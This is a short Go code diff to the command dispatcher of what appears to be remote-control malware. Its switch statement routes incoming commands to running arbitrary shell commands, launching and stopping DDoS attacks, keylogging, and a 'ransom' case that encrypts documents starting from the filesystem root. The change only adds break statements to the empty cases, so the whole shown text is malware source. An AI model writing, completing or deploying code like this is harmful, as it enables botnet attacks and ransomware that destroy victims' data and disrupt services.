@@ -6,22 +6,29 @@ func Execute(command string, target string, args string) {
 		case "cmd":
 			Run(args)
 		case "off":
+			break
 		case "lo":
+			break
 		case "kill":
+			break
 		case "msg":
+			break
 		case "web":
+			break
 		case "ddos":
 			DdosApi(100, args)
 		case "sdd":
 			StopDdos()
 		case "pass":
+			break
 		case "upgrade":
-
+			break
 		case "uninstall":
-
+			break
 		case "start-keylogger":
-
+			break
 		case "keylog":
+			break
 			//Send("res", KeyLogs)
 		case "ransom":
 			EncryptDocumets("/", true)
